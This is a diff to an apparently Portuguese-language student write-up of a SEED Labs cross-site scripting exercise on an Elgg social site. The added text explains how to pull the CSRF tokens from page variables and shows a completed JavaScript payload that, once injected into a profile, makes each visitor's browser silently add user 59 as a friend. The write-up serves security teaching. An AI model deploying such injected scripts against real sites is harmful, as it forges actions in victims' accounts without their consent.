@@ -96,7 +96,27 @@ Referer: http://www.seed-server.com/profile/samy
 Cookie: Elgg=6ci56crsicjs6buh3fjo2pf68o
 ```
 
-Analisando o pedido, verifica-se que o URL é `http://www.seed-server.com/action/friends/add` e o valor do parâmetro `friend` é **59** (ID de Samy), que é usado para especificar o utilizador que deve ser adicionado à lista de amigos. Existem mais dois parâmetros, `__elgg_ts` e `__elgg_token`, que são contramedidas contra ataques `CSRF`.
+Analisando o pedido, verifica-se que o URL é `http://www.seed-server.com/action/friends/add` e o valor do parâmetro `friend` é **59** (ID de Samy), que é usado para especificar o utilizador que deve ser adicionado à lista de amigos. Existem dois parâmetros, `__elgg_ts` e `__elgg_token`, que são contramedidas contra ataques `CSRF`, cujos valores são específicos da página e devem ser definidos devidamente no código de modo a evitar que o pedido seja tratado como _cross-site request_. Esses valores estão atribuídos a duas variáveis - `elgg.security.token.__elgg_ts` e `elgg.security.token.__elgg_token`, sendo estas utilizadas no código esqueleto nas linhas assinaladas 1 e 2. 
+Com esta informação é possível completar o código esqueleto fornecido no guião:
+
+```javascript
+<script type="text/javascript">
+    window.onload = function () {
+        var Ajax=null;
+
+        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+        var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+        // Construct the HTTP request to add Samy as a friend.
+        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + token + ts;
+
+        // Create and send Ajax request to add friend
+        Ajax=new XMLHttpRequest();
+        Ajax.open("GET", sendurl, true);
+        Ajax.send();
+    }
+</script>
+```
 
 # CTF - Semanas 10 e 11
 
